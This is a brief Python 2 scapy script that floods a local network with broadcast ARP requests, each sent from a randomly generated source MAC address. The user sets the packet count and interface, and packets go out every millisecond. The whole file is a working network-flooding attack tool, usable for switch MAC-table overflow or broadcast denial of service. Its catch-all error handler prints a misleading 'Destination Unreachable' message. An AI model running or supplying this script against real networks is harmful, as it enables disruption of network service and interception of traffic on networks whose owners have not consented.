from scapy.all import *
num = int(raw_input("Enter the number of packets "))
interface = raw_input("Enter the Interface ")

arp_pkt=ARP(pdst='192.168.1.255',hwdst="ff:ff:ff:ff:ff:ff")
eth_pkt = Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff")

try:
	sendp(eth_pkt/arp_pkt,iface=interface,count =num, inter= .001)

except : 
	print "Destination Unreachable "
	
	
